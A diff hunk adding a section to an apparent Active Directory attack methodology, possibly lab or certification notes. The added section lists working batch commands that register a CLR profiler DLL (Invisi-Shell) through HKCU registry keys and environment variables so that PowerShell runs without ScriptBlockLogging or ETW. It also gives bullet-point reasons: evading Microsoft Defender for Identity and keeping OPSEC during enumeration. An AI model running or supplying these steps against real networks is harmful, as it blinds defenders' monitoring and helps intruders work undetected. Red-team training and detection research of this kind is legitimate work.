@@ -7,6 +7,32 @@
 
 ### Phase 1A: Initial Domain Reconnaissance (No Privileges)
 
+#### Invishi-Shell Setup (Bypass Enhanced Logging)
+```batch
+REM Start Invishi-Shell to avoid ScriptBlockLogging and ETW
+C:\AD\Tools> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+
+REM Set environment variables for profiler bypass
+C:\AD\Tools>set COR_ENABLE_PROFILING=1
+C:\AD\Tools>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
+
+REM Add CLR profiler hook to registry
+C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
+C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
+C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\AD\Tools\InviShell\InShellProf.dll" /f
+
+REM Launch PowerShell from this session
+C:\AD\Tools>powershell
+```
+
+**Why This Matters:**
+- Prevents ScriptBlockLogging of PowerShell commands
+- Bypasses ETW (Event Tracing for Windows) monitoring
+- Allows running enumeration tools without triggering Microsoft Defender for Identity (MDI)
+- Critical for OPSEC during initial enumeration phase
+
+---
+
 #### User Enumeration
 ```powershell
 # PowerView Method
